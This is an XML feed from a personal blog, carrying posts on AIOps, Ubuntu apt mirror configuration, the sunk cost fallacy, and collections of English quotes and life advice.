Group&#x6709;&#x4E00;&#x4E2A;&#x8C03;&#x67E5;&#x663E;&#x793A;&#x5728;IT&#x9879;&#x76EE;&#x7ECF;&#x5E38;&#x51FA;&#x73B0;&#x7684;&#x95EE;&#x9898;&#x4E2D;&#xFF0C;&#x6E90;&#x81EA;&#x6280;&#x672F;&#x6216;&#x4EA7;&#x54C1;&#xFF08;&#x5305;&#x62EC;&#x786C;&#x4EF6;&#x3001;&#x8F6F;&#x4EF6;&#x3001;&#x7F51;&#x7EDC;&#x3001;&#x7535;&#x529B;&#x5931;&#x5E38;&#x53CA;&#x5929;&#x707E;&#x7B49;&#xFF09;&#x7684;&#x95EE;&#x9898;&#x53EA;&#x5360;20%&#xFF0C;&#x4F46;&#x6D41;&#x7A0B;&#x5931;&#x8BEF;&#x65B9;&#x9762;&#x5374;&#x5360;40%&#xFF0C;&#x4EBA;&#x5458;&#x758F;&#x5931;&#x65B9;&#x9762;&#x4E5F;&#x5360;&#x5230;&#x4E86;40%&#x3002;&#x8FD9;&#x4E9B;&#x5E74;&#x6765;&#xFF0C;&#x4F01;&#x4E1A;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x5E73;&#x53F0;&#x4EE5;&#x53CA;DevOps&#x7B49;&#x534F;&#x4F5C;&#x7406;&#x5FF5;&#x9010;&#x6B65;&#x89E3;&#x51B3;&#x4E86;Gartner&#x63D0;&#x5230;&#x7684;&#x6D41;&#x7A0B;&#x5931;&#x8BEF;&#x548C;&#x4EBA;&#x5458;&#x758F;&#x5FFD;&#x76F8;&#x5173;&#x7684;80%&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x867D;&#x7136;&#x76EE;&#x524D;&#x6CA1;&#x6709;&#x5177;&#x4F53;&#x7684;&#x7EDF;&#x8BA1;&#x6570;&#x636E;&#xFF0C;&#x4F46;&#x53EF;&#x4EE5;&#x786E;&#x8BA4;&#x7684;&#x662F;&#xFF0C;&#x8FD9;&#x4E00;&#x95EE;&#x9898;&#x5F97;&#x5230;&#x4E86;&#x6709;&#x6548;&#x89E3;&#x51B3;&#x3002;</p><p>&#x4F46;&#x53E6;&#x5916;&#x4E00;&#x4E2A;&#x503C;&#x5F97;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#x662F;&#x5F53;&#x524D;&#x7684;IT&#x9879;&#x76EE;&#x57FA;&#x7840;&#x8BBE;&#x65BD;&#x73AF;&#x5883;&#x4E0E;5&#x5E74;&#x524D;&#x5DF2;&#x7ECF;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x540C;&#x65E5;&#x800C;&#x8BED;&#xFF0C;&#x66F4;&#x4E0D;&#x7528;&#x8BF4;10&#x5E74;&#x524D;&#x3002;&#x8FD1;&#x51E0;&#x5E74;&#xFF0C;&#x968F;&#x7740;&#x4E91;&#x8BA1;&#x7B97;&#x3001;&#x5FAE;&#x670D;&#x52A1;&#x7B49;&#x6280;&#x672F;&#x7684;&#x6D41;&#x884C;&#xFF0C;&#x4EE5;&#x53CA;&#x4E92;&#x8054;&#x7F51;&#x4E1A;&#x52A1;&#x7684;&#x8FC5;&#x901F;&#x53D1;&#x5C55;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x8981;&#x5173;&#x6CE8;&#x7684;&#x670D;&#x52A1;&#x6570;&#x91CF;&#x4E5F;&#x5448;&#x73B0;&#x4E86;&#x6307;&#x6570;&#x7EA7;&#x589E;&#x957F;&#xFF0C;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x867D;&#x7136;&#x63D0;&#x5347;&#x4E86;&#x6548;&#x7387;&#xFF0C;&#x89E3;&#x51B3;&#x4E86;&#x4E00;&#x90E8;&#x5206;&#x95EE;&#x9898;&#xFF0C;&#x4F46;&#x4E5F;&#x9047;&#x5230;&#x4E86;&#x65B0;&#x7684;&#x96BE;&#x9898;&#xFF0C;&#x6BD4;&#x5982;&#x9762;&#x5BF9;&#x7E41;&#x591A;&#x7684;&#x62A5;&#x8B66;&#x4FE1;&#x606F;&#xFF0C;&#x8FD0;&#x7EF4;&#x4EBA;&#x5458;&#x5E94;&#x8BE5;&#x5982;&#x4F55;&#x5904;&#x7406;&#xFF1F;&#x6545;&#x969C;&#x53D1;&#x751F;&#x65F6;&#xFF0C;&#x53C8;&#x5982;&#x4F55;&#x80FD;&#x591F;&#x8FC5;&#x901F;&#x5B9A;&#x4F4D;&#x95EE;&#x9898;&#xFF1F;</p><p>&#x5F53;&#x4F01;&#x4E1A;&#x9047;&#x5230;&#x8FD9;&#x4E9B;&#x65B0;&#x7684;&#x95EE;&#x9898;&#x5374;&#x65E0;&#x4ECE;&#x4E0B;&#x624B;&#x65F6;&#xFF0C;&#x6070;&#x597D;&#x5386;&#x53F2;&#x8FDB;&#x5165;&#x4E86;&#x4EBA;&#x5DE5;&#x667A;&#x80FD;&#x65F6;&#x4EE3;&#xFF0C;&#x90A3;&#x4E0A;&#x9762;&#x7684;&#x8FD9;&#x4E9B;&#x95EE;&#x9898;&#x53EF;&#x5426;&#x901A;&#x8FC7;&#x300E;AI + Ops&#x300F;&#x7684;&#x8FD9;&#x79CD;&#x8DE8;&#x754C;&#x521B;&#x65B0;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x89E3;&#x51B3;&#x5462;&#xFF1F;&#x4E8E;&#x662F;Gartner&#x5728;2016&#x5E74;&#x65F6;&#x4FBF;&#x63D0;&#x51FA;&#x4E86;AIOps&#x7684;&#x6982;&#x5FF5;&#xFF0C;&#x5E76;&#x9884;&#x6D4B;&#x5230;2020&#x5E74;&#xFF0C;AIOps&#x7684;&#x91C7;&#x7528;&#x7387;&#x5C06;&#x4F1A;&#x8FBE;&#x5230;50%&#x3002;&#x7B80;&#x5355;&#x6765;&#x8BF4;&#xFF0C;AIOps&#x5C31;&#x662F;&#x5E0C;&#x671B;&#x57FA;&#x4E8E;&#x5DF2;&#x6709;&#x7684;&#x8FD0;&#x7EF4;&#x6570;&#x636E;&#xFF08;&#x65E5;&#x5FD7;&#x3001;&#x76D1;&#x63A7;&#x4FE1;&#x606F;&#x3001;&#x5E94;&#x7528;&#x4FE1;&#x606F;&#x7B49;&#xFF09;&#x5E76;&#x901A;&#x8FC7;&#x673A;&#x5668;&#x5B66;&#x4E60;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x4E00;&#x6B65;&#x89E3;&#x51B3;&#x81EA;&#x52A8;&#x5316;&#x8FD0;&#x7EF4;&#x6CA1;&#x529E;&#x6CD5;&#x89E3;&#x51B3;&#x7684;&#x95EE;&#x9898;&#x3002;</p><p>&#x5C31;&#x76EE;&#x524D;&#x6765;&#x770B;&#xFF0C;&#x56FD;&#x5185;&#x7684;&#x767E;&#x5EA6;&#x3001;&#x641C;&#x72D7;&#x3001;&#x5B9C;&#x4FE1;&#x3001;&#x963F;&#x91CC;&#x5DF4;&#x5DF4;&#x90FD;&#x5DF2;&#x7ECF;&#x63A2;&#x7D22;&#x5C1D;&#x8BD5;&#x4E86;AIOps&#xFF0C;&#x5E76;&#x4E14;&#x53D6;&#x5F97;&#x4E86;&#x4E0D;&#x9519;&#x7684;&#x6536;&#x76CA;&#x3002;&#x5728;2017&#x5E74;InfoQ&#x4E3E;&#x529E;&#x7684;CNUTCon&#x5168;&#x7403;&#x8FD0;&#x7EF4;&#x6280;&#x672F;&#x5927;&#x4F1A;&#x4E0A;&#xFF0C;&#x4E5F;&#x6709;&#x4E0D;&#x5C11;AIOps&#x76F8;&#x5173;&#x7684;&#x8BAE;&#x9898;&#xFF0C;&#x751A;&#x81F3;&#x4F1A;&#x8BAE;&#x4E3B;&#x9898;&#x4E5F;&#x4ECE;&#x53BB;&#x5E74;&#x7684;&#x5BB9;&#x5668;&#x751F;&#x6001;&#x8FED;&#x4EE3;&#x5230;&#x4ECA;&#x5E74;&#x7684;&#x667A;&#x80FD;&#x65F6;&#x4EE3;&#x7684;&#x65B0;&#x8FD0;&#x7EF4;&#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BFB;&#x8005;&#x53EF;&#x4EE5;&#x5173;&#x6CE8;&#x3002;</p><p>&#x672A;&#x6765;&#x8BBE;&#x60F3;&#xFF1A;&#x667A;&#x80FD;&#x8FD0;&#x7EF4;&#x7684;&#x7EC8;&#x6781;&#x76EE;&#x6807; &#x65E0;&#x4EBA;&#x503C;&#x5B88;&#xFF0C;&#x7CFB;&#x7EDF;&#x5177;&#x5907;&#x6545;&#x969C;&#x81EA;&#x6108;&#x3001;&#x65E0;&#x4EBA;&#x503C;&#x5B88;&#x53D8;&#x66F4;&#x3001;&#x81EA;&#x52A8;&#x6269;&#x7F29;&#x5BB9;&#x3001;&#x81EA;&#x52A8;&#x9632;&#x5FA1;&#x7B49;&#x80FD;&#x529B;&#xFF1B;&#x5982;&#x7535;&#x5F71;&#x300A;&#x592A;&#x7A7A;&#x65C5;&#x5BA2;&#x300B;&#x4E00;&#x8258;&#x8FD0;&#x9001;&#x6570;&#x5343;&#x51AC;&#x7720;&#x4EBA;&#x5230;&#x9065;&#x8FDC;&#x6B96;&#x6C11;&#x5730;&#x661F;&#x7403;&#x7684;&#x592A;&#x7A7A;&#x98DE;&#x8239;&#xFF0C;&#x4EC5;&#x4E00;&#x4E9B;&#x673A;&#x5668;&#x4EBA;&#x8D1F;&#x8D23;&#x98DE;&#x8239;&#x7684;&#x65E5;&#x5E38;&#x7EF4;&#x62A4;&#x3002;</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;运维岗位历史悠久&quot;&gt;&lt;a href=&quot;#运维岗位历史悠久&quot; class=&quot;headerlink&quot; title=&quot;运维岗位历史悠久&quot;&gt;&lt;/a&gt;运维岗位历史悠久&lt;/h3&gt;&lt;p&gt;提到运维很多人可能想到 IT系统的运维，其实运维岗位不仅仅最近几十年才有的工作岗位，大多运维的理念都来自人类医疗界，只不过医生是对人体这个超级复杂系统做运维，运维工程师运维的是IT系统而已。医生通过对生命以及生活的各种观察与衡量来维护生命的正常状态与运行；而运维工程师：通过对系统运行的各种观察与衡量来维护系统的正常状态与运行，如医生通过血常规、尿检等等观测指标再根据历史经验来评估一个人的身体状态，运维人员通过系统性能指标KPI变化、系统日志的根据经验找因果关系来定界定位故障；再如医生通过X射线拍CT、拍胸片来透视人体进一步观测人体细微变化来推断病因，而运维工程师则会把故障单元suspend住，放诊断器进行诊断，扫描内存堆栈等故障现场信息推到出故障根因等等，很多运维理念来至医学界。伴随科技的发展医疗诊断手段在不断演进，与医疗界一样运维也有其发展历程。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>十二句经典的爱情名言</title>
    <link href="https://marnm.github.io//posts/4c41c7ef/"/>
    <id>https://marnm.github.io//posts/4c41c7ef/</id>
    <published>2020-08-26T12:42:05.000Z</published>
    <updated>2020-08-26T12:50:54.486Z</updated>
    
    <content type="html"><![CDATA[<p>Who, being loved, is poor? &#x2014;&#x2014;Oscar Wilde</p><p>Each time you happen to me all over again. &#x2014;&#x2014;Edith Wharton</p><p>Grow old along with me! The best is yet to be. &#x2014;&#x2014;Robert Browning</p><p>Whatever our souls are made of, his and mine are the same. &#x2014;&#x2014;Emily Bronte</p><p>I love her, and that&#x2019;s the beginning and end of everything. &#x2014;&#x2014;F.Scott Shakespeare</p><p>My heart, the bird of the wilderness, has found its sky in you eyes. &#x2014;&#x2014;Tagore</p><p>You should be kissed and often, and by someone who knows how. &#x2014;&#x2014;&#x201C;Gone With the Wind&#x201D;</p><p>He was my North, my South, my East and West, My working week and my Sunday rest. &#x2014;&#x2014;W.H.Auden</p><p>In vain I have struggled. It will not do. My feelings will not be repressed. You must allow me to tell you how ardently I admire and love you. &#x2014;&#x2014;Jane Austen</p><p>Every atom of your flesh is as dear to me as my own: in pain and sickness it would still be dear. &#x2014;&#x2014;Charlotte Bronts</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Who, being loved, is poor? &amp;#x2014;&amp;#x2014;Oscar Wilde&lt;/p&gt;
&lt;p&gt;Each time you happen to me all over again. &amp;#x2014;&amp;#x2014;Edith Wharton&lt;/p
      
    
    </summary>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>Ubuntu修改配置及美化</title>
    <link href="https://marnm.github.io//posts/129acd64/"/>
    <id>https://marnm.github.io//posts/129acd64/</id>
    <published>2020-08-22T10:38:41.000Z</published>
    <updated>2020-08-22T10:49:35.731Z</updated>
    
    <content type="html"><![CDATA[<p>&#x8FD9;&#x91CC;&#x8BF4;&#x4E00;&#x4E9B;&#x5728;Ubuntu18.04&#x4E0B;&#x7684;&#x57FA;&#x672C;&#x914D;&#x7F6E;&#x53CA;&#x7F8E;&#x5316;</p><a id="more"></a><p>&#x5B89;&#x88C5;&#x5B8C;&#x7CFB;&#x7EDF;&#x540E;&#x76F4;&#x63A5;&#x4FEE;&#x6539;&#x955C;&#x50CF;&#x6E90;&#xFF0C;&#x6539;&#x6210;&#x56FD;&#x5185;&#x7684;&#xFF1A;</p><p>&#x5907;&#x4EFD;</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mv /etc/apt/source.list /etc/apt/source.list.backup</span><br></pre></td></tr></tbody></table></figure><p>&#x963F;&#x91CC;&#x4E91;&#x7684;Ubuntu18.04&#x6E90;&#xFF1A;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line">deb http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line">deb-src http://mirrors.aliyun.com/ubuntu/ bionic-backports main restricted universe multiverse</span><br></pre></td></tr></tbody></table></figure><p>&#x6E05;&#x534E;&#x7684;18.04&#x955C;&#x50CF;&#x6E90;&#xFF1A;</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># &#x9ED8;&#x8BA4;&#x6CE8;&#x91CA;&#x4E86;&#x6E90;&#x7801;&#x955C;&#x50CF;&#x4EE5;&#x63D0;&#x9AD8; apt update &#x901F;&#x5EA6;&#xFF0C;&#x5982;&#x6709;&#x9700;&#x8981;&#x53EF;&#x81EA;&#x884C;&#x53D6;&#x6D88;&#x6CE8;&#x91CA;</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-updates main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-backports main restricted universe multiverse</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-security main restricted universe multiverse</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &#x9884;&#x53D1;&#x5E03;&#x8F6F;&#x4EF6;&#x6E90;&#xFF0C;&#x4E0D;&#x5EFA;&#x8BAE;&#x542F;&#x7528;</span></span><br><span class="line"><span class="comment"># deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br><span class="line"><span class="comment"># deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ bionic-proposed main restricted universe multiverse</span></span><br></pre></td></tr></tbody></table></figure><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里说一些在Ubuntu18.04下的基本配置及美化&lt;/p&gt;
    
    </summary>
    
    
      <category term="Linux" scheme="https://marnm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>你要懂得及时止损，别太在乎沉没成本</title>
    <link href="https://marnm.github.io//posts/bb750036/"/>
    <id>https://marnm.github.io//posts/bb750036/</id>
    <published>2020-08-21T14:57:52.000Z</published>
    <updated>2022-05-26T13:50:48.640Z</updated>
    
    <content type="html"><![CDATA[<h3 id="How-to-Tell-That-It&#x2019;s-Time-to-Quit"><a href="#How-to-Tell-That-It&#x2019;s-Time-to-Quit" class="headerlink" title="How to Tell That It&#x2019;s Time to Quit"></a>How to Tell That It&#x2019;s Time to Quit</h3><blockquote><p>&#x5982;&#x4F55;&#x8FA8;&#x8BA4;&#x4EC0;&#x4E48;&#x65F6;&#x5019;&#x8BE5;&#x653E;&#x5F03;</p></blockquote><p>Quitting is usually perceived to be negative, whereas perseverance is seen as admirable and even essential for success in life.</p><p>Surprisingly, though, when perseverance is taken too far, it becomes self-destructive. Research shows that people who let go of unattainable goals experience higher well-being. So why is it so hard to surrender?</p><a id="more"></a><p>Here is the one thing to consider in order to celebrate &#x201C;failure&#x201D;: We may be biased against quitting because we are trapped in the &#x201C;sunk cost fallacy.(&#x6C89;&#x6CA1;&#x6210;&#x672C;&#x8BEF;&#x8C2C;)&#x201D;</p><p>In economics, sunk costs are those past cost that has already been paid and cannot be recovered. They represent the time and effort already spent on a project.</p><p>Let&#x2019;s say you buy tickets to a concert. On the day of the event, you catch a cold. Even though you are sick, you decide to go to the concert because otherwise &#x201C;you would have wasted your money&#x201D;.</p><p>Boom! You just fell for the &#x201C;sunk cost fallacy.&#x201D;</p><p>Sure, you spent the money already. But you can&#x2019;t get it back. If you aren&#x2019;t going to have a good time at the concert, you only make your life worse by going.</p><p>Everyone experiences the influence of sunk costs in some form or another, whether through the investment of time or money in projects or doomed relationships. It is hard to let go. And while we know it&#x2019;s common, the sunk cost fallacy may also be more dangerous than we realize.</p><p>Holding on to a current subpar opportunity hinders the potential for one&#x2019;s future. To help you let go of sunk-cost thinking, economics recommend instead considering opportunity cost. Whereas a sunk cost is about the past, opportunity cost is about the future.</p><p>In a world of finite resources, every dollar you spend on one thing is not spent elsewhere. Held back by yesterday&#x2019;s projects, you cannot solve future problems. Letting go, then, and ending the continued investment of time, money, or energy in one direction offers us practical and mental freedom to advance in another, more promising area.</p><p>Those who quit dead-end endeavors are mentally healthier than those who stay entrapped, as people trapped by dead-end goals may begin to experience negative effects like anxiety and diminished well-being.</p><p>When we are overly focused on a particular goal or outcome, we become rigid and inflexible. This narrows our options and makes us feel more limited. Use your time and resources more effectively: Do not be afraid to give up frustrating goals. New opportunities will be just around the corner.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;How-to-Tell-That-It’s-Time-to-Quit&quot;&gt;&lt;a href=&quot;#How-to-Tell-That-It’s-Time-to-Quit&quot; class=&quot;headerlink&quot; title=&quot;How to Tell That It’s Time to Quit&quot;&gt;&lt;/a&gt;How to Tell That It’s Time to Quit&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;如何辨认什么时候该放弃&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Quitting is usually perceived to be negative, whereas perseverance is seen as admirable and even essential for success in life.&lt;/p&gt;
&lt;p&gt;Surprisingly, though, when perseverance is taken too far, it becomes self-destructive. Research shows that people who let go of unattainable goals experience higher well-being. So why is it so hard to surrender?&lt;/p&gt;
    
    </summary>
    
      <category term="英语" scheme="https://marnm.github.io/categories/%E8%8B%B1%E8%AF%AD/"/>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>诺尔·巴尔扎克（Honoréde Balzac）的名言</title>
    <link href="https://marnm.github.io//posts/51acad32/"/>
    <id>https://marnm.github.io//posts/51acad32/</id>
    <published>2020-08-19T14:32:17.000Z</published>
    <updated>2020-08-19T15:05:40.527Z</updated>
    
    <content type="html"><![CDATA[<p>Honor&#xE9;de de Balzac was a novelist and playwright in nineteenth-century France. Among his most successful works were La Duchesse de La Duchesse de Langeais, Eugenie Grandet, and Pere Goriot, La Comedie Humaine.</p><p>The greatest legacy Honor&#xE9;de Balzac left behind was the use of realism in the novel.  The structure of his novels, in which the plot is presented in sequential order by an omniscient narrator and one event causes another, was influential for many later writers. Literary scholars have also focused on his exploration of the links between social standing and character development, as well as a belief in the strength of the human spirit that has endured to this day.</p><p>In commemoration of the 170th anniversary of the death of Honor&#xE9;de de Balzac, we some quotes from his works.</p><a id="more"></a><p>Love is the poetry of the senses. <code>&#x7231;&#x662F;&#x611F;&#x5B98;&#x7684;&#x8BD7;&#x6B4C;</code></p><p>Vanity is only to be satisfied by gold in floods. <code>&#x865A;&#x8363;&#x5FC3;&#x7531;&#x6CDB;&#x6EE5;&#x7684;&#x91D1;&#x94B1;&#x6765;&#x586B;&#x8865;</code></p><p>Excess of joy is harder to bear than any amount of sorrow.<code>&#x8FC7;&#x5EA6;&#x7684;&#x6B22;&#x4E50;&#x6BD4;&#x4EFB;&#x4F55;&#x7A0B;&#x5EA6;&#x7684;&#x60B2;&#x4F24;&#x90FD;&#x96BE;&#x53D7;</code></p><p>The most natural feelings are those we are least willing to confess.<code>&#x6700;&#x81EA;&#x7136;&#x7684;&#x611F;&#x89C9;&#x662F;&#x6211;&#x4EEC;&#x6700;&#x4E0D;&#x613F;&#x627F;&#x8BA4;&#x7684;&#x611F;&#x89C9;</code></p><p>All poetry, like every work of art, proceeds from a swift vision of things.</p><p>The heart of a mother is a deep abyss at the bottom of which you will always find forgiveness.</p><p>People exaggerate both happiness and unhappiness; we are never so fortunate nor so unfortunate as people say we are.</p><p>Such is life. It is no cleaner than a kitchen; it reeks like a kitchen; and if you mean to cook your dinner, you must expect to soil your hands; the real art is in getting them clean again, and therein lies the whole morality of our epoch.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Honoréde de Balzac was a novelist and playwright in nineteenth-century France. Among his most successful works were La Duchesse de La Duchesse de Langeais, Eugenie Grandet, and Pere Goriot, La Comedie Humaine.&lt;/p&gt;
&lt;p&gt;The greatest legacy Honoréde Balzac left behind was the use of realism in the novel.  The structure of his novels, in which the plot is presented in sequential order by an omniscient narrator and one event causes another, was influential for many later writers. Literary scholars have also focused on his exploration of the links between social standing and character development, as well as a belief in the strength of the human spirit that has endured to this day.&lt;/p&gt;
&lt;p&gt;In commemoration of the 170th anniversary of the death of Honoréde de Balzac, we some quotes from his works.&lt;/p&gt;
    
    </summary>
    
      <category term="英语" scheme="https://marnm.github.io/categories/%E8%8B%B1%E8%AF%AD/"/>
    
    
      <category term="英语" scheme="https://marnm.github.io/tags/%E8%8B%B1%E8%AF%AD/"/>
    
  </entry>
  
  <entry>
    <title>In Your 20&#39;s These Things Matter More Than You Think</title>
    <link href="https://marnm.github.io//posts/4def9c28/"/>
    <id>https://marnm.github.io//posts/4def9c28/</id>
    <published>2020-08-18T12:54:13.000Z</published>
    <updated>2020-08-18T13:30:21.445Z</updated>
    
    <content type="html"><![CDATA[<p>In my twenties, I had no idea what would matter long term. I&#x2019;m a smart person, but I didn&#x2019;t think much about my future. I lived moment to moment, without much thought or planning. Instead, I put my energy into what I thought mattered at the time. Getting good grades, dating, friends, going out to bars, and my appearance were top of the list.</p><a id="more"></a><p>Now, at 41, with the benefit of hindsight, I can see that some of my decisions mattered a lot. If I could go back and do my twenties again, I&#x2019;d use my energy in quite a different way.</p><p>Here are some things that are more important long-term that I realized:</p><p><strong>Developing you marketable skills</strong></p><p>I was accepted into two amazing Master&#x2019;s programs. The topics were exciting, but I turned them both down for a teaching position. I&#x2019;d already spent 5 years at university and if felt irresponsible studying for so long. I&#x2019;ll do my Masters later, I thought. I should probably be an adult and take this job.</p><p>What I didn&#x2019;t realize is how much harder it is to study later in life. I know people who are studying while parenting and working, but it&#x2019;s tough. Life gets busier and more complex.</p><p>Not everyone needs to get a degree, of course, but the world is competitive. Getting the highest level of education you are able to (and want to) can give you an advantage Having a tertiary education or specialized training makes it easier to get work later, and the jobs available to you are often more interesting, creative, and satisfying.</p><p><strong>Spending your time wisely</strong></p><p>I spent a lot of energy in my early 20&#x2019;s on relationships that I knew were going nowhere. Most of my free time was taken up by my boyfriends &#x2014;&#x2014; time I could have spent exploring hobbies, going on adventures with friends, meeting new people, and pursuing my own interests.</p><p>I knew early on I wasn&#x2019;t going to marry these guys. The time I invested in those relationships was mostly wasted. Instead of keeping my boyfriends happy, I could have used that time to work on becoming the person I wanted to be.</p><p>That&#x2019;s one of your main jobs in this time of life. In my 20&#x2019;s I thought I&#x2019;d just &#x201C;find myself&#x201D; but it doesn&#x2019;t work like that. What I&#x2019;ve realized is you don&#x2019;t find yourself, you create yourself. You decide who you want to be, what kind of life you want, and create that for yourself.</p><p><strong>Saying yes or no to love</strong></p><p>Learning what makes a good relationship matters. At 23, I got engaged after six months of dating. Looking back, I barely knew my ex, but it didn&#x2019;t feel like it mattered. It felt romantic and intense. It felt like the next logical stage in my life &#x2014;&#x2014; mid twenties, get married, have kids, get a house&#x2026;</p><p>I didn&#x2019;t know about stages of love, red flags, toxic patterns of communication, how to deal with conflict well, chemistry and compatibility, or how to make a marriage work. I was very green and it mattered more than I realized. </p><p>Who you choose to say &#x201C;yes&#x201D; to makes a huge impact on your life for many years. Arm yourself with knowledge to choose well.</p><p><strong>Facing your demons</strong></p><p>Like many young people, I had issues left over from childhood that I didn&#x2019;t want to face. I thought I was doing what was best: forget it and move on! But by not dealing with my past, I made life harder for myself that it needed to be.</p><p>Not dealing with my problems had consequences. In my social life and relationships it meant I worked to hard to please people. In my work and study, it meant I pushed myself to exhaustion.</p><p>It wasn&#x2019;t until a few years ago that I realized how important it is to deal with and take responsibility for your own issues. Ignoring your past issues can leave you vulnerable to depression, anxiety, low self-worth, and low self-awareness.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
